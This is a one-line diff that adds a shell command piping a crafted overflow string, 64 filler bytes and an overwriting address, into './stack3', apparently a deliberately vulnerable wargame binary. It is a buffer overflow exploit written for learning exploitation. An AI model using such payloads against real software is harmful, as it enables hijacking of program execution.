@@ -1,0 +1,2 @@
+python -c 'print "A"*64+chr(0x99)+chr(0xff)+chr(0xff)+chr(0xff)' | ./stack3
+
